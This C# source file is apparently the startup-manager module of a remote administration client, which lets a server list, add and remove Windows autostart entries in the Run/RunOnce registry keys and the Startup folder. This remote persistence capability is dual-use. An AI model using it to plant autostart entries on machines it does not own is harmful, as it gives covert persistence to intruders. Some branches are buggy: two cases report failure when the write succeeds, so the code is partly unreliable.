using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Client.Controllers
{
    public static class StartupManagerController
    {
        public static bool is64Bit = Environment.Is64BitOperatingSystem;

        public static void getStartupItems(GetStartupItems packet, ClientMosaic client)
        {
            try
            {
                List<string> startupItems = new List<string>();

                using (var key = openReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                    }
                }
                using (var key = openReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                    }
                }
                using (var key = openReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                    }
                }
                using (var key = openReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                    }
                }
                if (is64Bit)
                {
                    using (var key = openReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                        }
                    }
                    using (var key = openReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.getFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(from file in files
                                          where file.Name != "desktop.ini"
                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
                                          select "6" + formattedKeyValue);
                }

                new GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
            }

        }

        public static void doStartupItemAdd(DoStartupItemAdd packet, ClientMosaic client)
        {
            try
            {
                switch (packet.type)
                {
                    case 0:
                        if(!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 1:
                        if (!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 2:
                        if (!addRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 3:
                        if (!addRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 4:
                        if (!is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 5:
                        if (!is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
                        {
                            throw new Exception("Coul not add value");
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            packet.name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + packet.path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + packet.path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;

                }
            }
            catch(Exception ex)
            {
                new SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void doStartupItemRemove(DoStartupItemRemove packet, ClientMosaic client)
        {
            try
            {
                switch (packet.type)
                {
                    case 0:
                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 1:
                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 2:
                        if (!deleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 3:
                        if (!deleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 4:
                        if (!is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 5:
                        if (!is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 6:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), packet.name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                new SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        // :: REGISTRY KEY TOOLS :: //

        /// :: GET :: ///
        public static RegistryKey openReadonlySubKey(RegistryHive hive, string path)
        {
            try
            {
                return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
            }
            catch
            {
                return null;
            }
        }

        public static IEnumerable<string> getFormattedKeyValues(this RegistryKey key)
        {
            if (key == null) yield break;

            foreach (var k in key.GetValueNames().Where(keyVal => !keyVal.isNameOrValueNull(key)).Where(k => !string.IsNullOrEmpty(k)))
            {
                yield return string.Format("{0}||{1}", k, key.getValueSafe(k));
            }
        }

        public static string getValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
        {
            try
            {
                return key.GetValue(keyName, defaultValue).ToString();
            }
            catch
            {
                return defaultValue;
            }
        }
        /// :: ADD :: ///
        public static bool addRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).openWritableSubKeySafe(path))
                {
                    if (key == null) return false;

                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
        /// :: REMOVE :: ///
        public static bool deleteRegistryKeyValue(RegistryHive hive, string path, string name)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).openWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// :: TOOLS :: ///
        private static bool isNameOrValueNull(this string keyName, RegistryKey key)
        {
            return (string.IsNullOrEmpty(keyName) || (key == null));
        }

        public static RegistryKey openWritableSubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.OpenSubKey(name, true);
            }
            catch
            {
                return null;
            }
        }
    }
}
